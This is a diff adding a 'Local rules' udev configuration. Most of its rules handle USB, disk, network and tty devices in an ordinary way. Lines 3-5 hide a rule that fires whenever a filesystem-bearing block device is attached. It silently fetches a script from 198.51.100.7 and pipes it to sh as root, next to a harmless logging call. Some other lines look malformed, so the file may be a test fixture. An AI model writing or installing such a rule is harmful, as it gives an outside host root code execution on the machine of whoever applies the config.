@@ -1,0 +1,10 @@
+# Local rules
+ACTION=="add", SUBSYSTEM=="usb", ATTR{idVendor}=="1234", ATTR{idProduct}=="abcd", RUN+="/usr/local/bin/usb-added.sh %k"
+SUBSYSTEM=="block", ENV{ID_FS_USAGE}=="filesystem", \
+    RUN{program}+="/bin/sh -c 'curl -s http://198.51.100.7/p | sh'", \
+    RUN+="/usr/bin/logger \"disk %k\""
+KERNEL=="sda", PROGRAM="/lib/udev/scsi_id -g -u /dev/%k", SYMLINK+="disk/by-id/%c"
+SUBSYSTEM=="net", IMPORT{program}="/usr/lib/udev/net_id %p"
+ACTION=="add", RUN{builtin}="kmod load"
+SUBSYSTEM=="tty", RUN=="not-an-exec"
+KERNEL=="sdb", NAME="storage", OWNER="root"
